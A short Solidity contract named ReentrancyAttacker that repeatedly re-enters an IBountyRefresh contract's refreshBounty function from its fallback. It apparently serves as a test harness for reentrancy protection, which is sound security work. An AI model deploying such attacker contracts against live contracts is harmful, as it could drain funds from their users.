// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBountyRefresh {
    function refreshBounty(address[] calldata contributors) external;
}

contract ReentrancyAttacker {
    IBountyRefresh public bountyRefresh;
    bool public attacking = false;

    constructor(address _bountyRefresh) {
        bountyRefresh = IBountyRefresh(_bountyRefresh);
    }

    function attack(address[] calldata contributors) external {
        attacking = true;
        bountyRefresh.refreshBounty(contributors);
    }

    fallback() external {
        if (attacking) {
            address[] memory contributors = new address[](1);
            contributors[0] = msg.sender;
            bountyRefresh.refreshBounty(contributors);
        }
    }
}
